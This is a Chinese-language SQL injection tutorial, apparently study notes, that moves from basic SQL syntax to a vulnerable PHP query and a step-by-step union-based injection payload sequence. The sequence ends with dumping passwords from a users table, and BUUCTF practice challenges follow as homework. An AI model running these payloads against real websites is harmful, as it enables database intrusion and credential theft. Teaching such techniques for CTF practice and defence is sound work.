# 数据库
数据库（database）是用来组织、存储和管理数据的仓库。
当今世界是一个充满着数据的互联网世界，为了方便管理互联网世界中的数据，就有了数据库管理系统的概念。用户可以对数据库中的数据进行新增、查询、更新、删除等操作。
# SQL
 SQL（Structured Query Language，结构化查询语言）是一种用于管理和操作关系型数据库的标准化编程语言。 
基于SQL语言的数据库：MySQL、SQL Server、Access、Oracle、Sybase、DB2等
# MySQL
 MySQL 是最流行的数据库管理系统，在 WEB 应用方面最好的数据库管理应用软件之一
# SQL注入原理
![](https://cdn.nlark.com/yuque/0/2024/jpeg/34908308/1723633959509-226680b9-3059-4f45-896e-ce5648e3aeb8.jpeg)
 当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。  
# 前置语法知识
## 注释符
```
#注释
-- 注释

/*
注释
*/
```
## SELECT
SELECT 语句用于从数据库中选取数据。
结果被存储在一个结果表中，称为结果集。
```
-- 选择所有列的所有行
SELECT * FROM users;

-- 选择特定列的所有行
SELECT username, email FROM users;

-- 添加 WHERE 子句，选择满足条件的行
SELECT * FROM users WHERE is_active = TRUE;

SELECT 1,2,3;

-- 显示当前所在数据库
SELECT DATABASE();
```
## ORDER BY
 用于对结果集按照一个列或者多个列进行排序  
```
-- 添加 ORDER BY 子句，按照某列的升序排序
SELECT * FROM users ORDER BY birthdate;

-- 添加 ORDER BY 子句，按照某列的降序排序
SELECT * FROM users ORDER BY birthdate DESC;

SELECT * FROM users ORDER BY 1;
```
## UNION
 UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合
```
SELECT city FROM customers UNION SELECT city FROM suppliers ORDER BY city;
```
## GROUP_CONCAT()
一种聚合函数，可以将满足条件的所有数据聚合到一列显示出来
## information_schema
mysql中自带的数据库，其中统计了这个所有数据库的表名、字段名
# 联合注入
## 数字型注入
注入时输入参数为纯数字
## 字符型注入
注入时输入参数要带引号等

源码：
```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

4' LIMIT 0,1
```
payload：
```
# 找列数
id=1' order by 3-- s
id=1' order by 4-- s
# 确定哪个字段有回显
id=-1' union select 1,2,3-- s
# 确定当前数据库
id=-1' union select 1,2,database()-- s
# 爆出当前数据库内的所有表名
id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- s
# 爆出当前数据库user表的所有列名
id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()-- s

id=-1' union select 1,2,group_concat(password) from users-- s
```
# 作业
BUUCTF：
[极客大挑战 2019]EasySQL
BUU SQL COURSE 1
[极客大挑战 2019]LoveSQL
